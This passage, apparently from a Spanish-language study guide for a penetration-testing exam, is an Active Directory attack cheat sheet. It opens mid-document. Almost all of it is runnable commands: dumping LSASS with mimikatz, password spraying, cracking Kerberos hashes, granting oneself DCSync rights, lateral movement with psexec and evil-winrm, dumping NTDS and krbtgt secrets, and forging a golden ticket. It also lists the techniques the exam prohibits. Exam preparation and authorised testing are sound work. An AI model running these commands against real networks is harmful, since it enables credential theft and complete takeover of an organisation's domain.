.\SharpHound.exe -c All --zipfilename bh.zip     # o SharpHound.ps1

# Dump de LSASS / SAM
.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 5. Credenciales: reuso y spraying seguro

```bash
# 1) Política PRIMERO
nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol

# 2) Wordlist de contexto (empresa/año/estación), NO rockyou directo
cat > spray.txt <<'EOF'
Password2026!
<Empresa>2026!
Enero2026!
<dominio>123
Welcome1!
EOF

# 3) Una sola contraseña contra muchos usuarios
nxc smb "$DC_IP" -u users.txt -p 'Password2026!' -d "$DOMAIN" --continue-on-success
kerbrute passwordspray -d "$DOMAIN" --dc "$DC_IP" users.txt 'Password2026!'
```

```bash
# Aprovechar cada usuario en TODOS los protocolos de un host
for svc in smb ldap winrm mssql rdp; do
  nxc "$svc" "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" 2>/dev/null | grep -iE '\[\+|Pwn3d|\+'
done
```

Cracking (con reglas, no solo el diccionario):

```bash
hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 6. Kerberos: tickets y troubleshooting

```bash
kinit "$USER@$REALM"        # pedir TGT
klist                        # listar
kdestroy                     # limpiar

export KRB5CCNAME="$PWD/ticket.ccache"        # usar un tique
ticketConverter.py ticket.kirbi ticket.ccache # kirbi <-> ccache
```

| Error | Causa | Arreglo |
| --- | --- | --- |
| `KRB_AP_ERR_SKEW` | reloj desfasado | `sudo ntpdate $DC_IP` |
| `Cannot contact any KDC` | el nombre no resuelve | `/etc/hosts` + `/etc/resolv.conf` |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | usuario/realm mal | revisá `$REALM` en mayúsculas |
| `Server not found in Kerberos DB` | SPN o DNS | `/etc/hosts` con el hostname exacto |
| `Connection refused` con `-k` | `KRB5CCNAME` mal o caducó | `export KRB5CCNAME=...` y `klist` |
| Kerberos falla tras el túnel | UDP no pasa por SOCKS | `udp_preference_limit = 0` en `krb5.conf` |

### 7. ACLs: leer, explotar y revertir

```bash
# Leer la ACL de un objeto (¿qué puedo?)
dacledit.py -action read -principal "$USER" -target-dn "<DN>" -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASS" get object "<target>" --attr nTSecurityDescriptor

# Backup / restore (siempre antes de tocar)
dacledit.py -action backup  -target-dn "<DN>" -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"
dacledit.py -action restore -target-dn "<DN>" -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"

# Otorgarse FullControl / DCSync
dacledit.py -action write -rights FullControl -principal "$USER" -target "<TARGET>" -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"
dacledit.py -action write -rights DCSync     -principal "$USER" -target "$DOMAIN"  -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"
bloodyAD  --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASS" add dcsync "$USER"
```

### 8. Movimiento lateral en un paso

```bash
# Ejecutar donde somos admin (lista de hosts)
nxc smb targets.txt -u "$USER" -p "$PASS" -d "$DOMAIN" -x 'whoami'
nxc smb targets.txt -u "$USER" -p "$PASS" -d "$DOMAIN" -x 'net localgroup administrators'

# evil-winrm (subir scripts/exes)
evil-winrm -i "$IP" -u "$USER" -p "$PASS" -s /opt/scripts -e /opt/exes
evil-winrm -i "$IP" -u "$USER" -H "$NTHASH"
evil-winrm -i "$IP" -u "$USER" -K ticket.ccache -r "$REALM"   # con tique

# Impacket (con password, hash o tique)
psexec.py  "$DOMAIN/$USER:$PASS@$IP"
wmiexec.py "$DOMAIN/$USER:$PASS@$IP"
psexec.py  -hashes :"$NTHASH" "$DOMAIN/$USER@$IP"
export KRB5CCNAME=t.ccache && wmiexec.py -k -no-pass "$DOMAIN/$USER@$IP"
```

### 9. Dump de secretos

```bash
nxc smb  "$IP"    -u "$USER" -p "$PASS" -d "$DOMAIN" --sam --lsa
nxc smb  "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --ntds
secretsdump.py -just-dc     "$DOMAIN/$USER:$PASS@$DC_IP"
secretsdump.py -just-dc-user krbtgt "$DOMAIN/$USER:$PASS@$DC_IP"
secretsdump.py -hashes :"$NTHASH" "$DOMAIN/$USER@$DC_IP" -just-dc-ntlm
```

### 10. Golden ticket en 3 líneas

```bash
# 1) SID y hash del krbtgt
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --get-sid
secretsdump.py -just-dc-user krbtgt "$DOMAIN/$USER:$PASS@$DC_IP"
# 2) Forjar
# 3) Usar
ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <SID> -domain "$DOMAIN" Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass "$DC_HOST"
```

### 11. Puerto → herramienta

| Puerto | Servicio | Herramienta rápida |
| --- | --- | --- |
| 88 | Kerberos | `getTGT.py`, `GetUserSPNs.py`, `GetNPUsers.py`, Rubeus |
| 135 | MS-RPC | `rpcclient`, `lookupsid.py` |
| 139/445 | SMB | `nxc smb`, `smbclient`, BloodHound |
| 389/636 | LDAP/LDAPS | `nxc ldap`, `ldapsearch`, `bloodyAD` |
| 1433 | MSSQL | `nxc mssql`, `mssqlclient.py` |
| 3389 | RDP | `nxc rdp`, `xfreerdp3` |
| 5985/5986 | WinRM | `nxc winrm`, `evil-winrm` |

### 12. No perder evidencia

```bash
script -a ~/examen/evidencia/ad/sesion.log      # graba todo
nxc ... --log ~/examen/evidencia/ad/nxc.log     # log de nxc
tee ~/examen/evidencia/ad/out.txt               # al final de cualquier comando
```

---

## Fuera de alcance / prohibido

Estos **no entran** en el examen (o están directamente **prohibidos**), pero quedan documentados
para practice labs:

> **El relay NTLM SÍ entra** (ver Fase 5b). **PROHIBIDO**: la **coerción** y el
> **spoofing/poisoning** (Responder sin `-A`, Inveigh, mitm6). **Fuera de alcance**: los **certificados**.

| Tema | Estado |
| --- | --- |
| **Coerción** (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, `coercer`) | **PROHIBIDO** |
| **Spoofing/poisoning** (Responder sin `-A`, Inveigh, mitm6) | **PROHIBIDO** |
| **Certificados / ADCS** (ESC1-15, Certifried, Shadow Credentials, Pass-the-Certificate, Golden Certificate) | fuera de alcance |
| Kerberos avanzado (Diamond/Sapphire, Bronze Bit, UnPAC, noPac, Timeroast, SCCM/Exchange) | fuera de alcance |
| Referencia de coerción (prohibida) | [`../cheatsheets/rpc-coercion.md`](../cheatsheets/rpc-coercion.md) |
| Referencia de ADCS (fuera) | [`../cheatsheets/adcs-esc.md`](../cheatsheets/adcs-esc.md) |

---

## Chuletas relacionadas

- [cheatsheets/nxc.md](../cheatsheets/nxc.md) — NetExec 1.5.1
- [cheatsheets/impacket.md](../cheatsheets/impacket.md) — Impacket 0.14.0.dev0
- [cheatsheets/potatoes.md](../cheatsheets/potatoes.md) — escalada en hosts Windows del set
- [07-pivoting.md](07-pivoting.md) — para atravesar el set de 3 máquinas
